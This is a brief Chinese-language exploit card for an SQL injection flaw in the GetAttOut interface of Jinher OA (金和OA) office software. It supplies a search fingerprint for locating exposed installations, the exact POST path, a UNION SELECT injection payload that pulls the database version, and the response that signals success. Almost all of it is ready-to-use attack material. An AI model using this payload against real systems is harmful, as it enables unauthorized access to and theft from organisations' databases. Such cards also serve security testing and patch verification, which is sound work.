# 金和OAGetAttOut接口SQL注入漏洞

金和OA ｜ SQL注入 ｜ —
- **指纹**：`app="金和网络-金和OA"`
- **请求**：`POST /jc6/JHSoft.WCF/TEST/GetAttOut HTTP/1.1`

**Payload**
```
1' union select null,null,@@version,null,null,null--
```
- **响应特征**：200 success